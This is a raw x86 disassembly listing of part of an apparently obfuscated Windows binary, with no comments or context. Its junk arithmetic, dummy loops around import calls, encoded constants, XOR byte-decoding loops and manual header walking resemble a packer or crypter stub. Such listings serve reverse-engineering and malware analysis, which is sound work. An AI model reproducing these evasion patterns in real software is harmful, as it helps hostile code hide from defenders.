  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421a96
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421c9e
  41afcc:	mov    ecx,DWORD PTR ds:0x421a0e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x4238d2
  41b017:	push   0x423852
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c16
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x42382d
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423844
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c36
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421b8c
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x4239a2
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d26,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423af1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d2a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
